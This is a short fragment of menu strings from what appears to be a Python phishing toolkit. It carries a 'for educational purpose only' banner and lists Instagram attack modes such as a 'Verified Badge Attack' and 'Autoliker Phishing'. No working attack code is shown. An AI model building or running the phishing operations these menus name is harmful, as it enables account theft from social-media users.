...
lang_start_main_menu = {
    "version_by_darksec":
    _("                                              FOR EDUCATIONAL PURPOSE ONLY {1}"
    ...
    "instagram_operation_modes": [
        [
            ...
            _("{0}[{1}4{0}]{1} Instagram Verified Badge Attack "
              ),
        ],
        [
            _("{0}[{1}2{0}]{1} Instagram Autoliker Phishing "
              ),
            _("{0}[{1}5{0}]{1} Instafollower "),
        ],
        [
            _("{0}[{1}3{0}]{1} Instagram Advanced Scenario"
              )
        ],
    ],
    "VK_operation_modes": [[
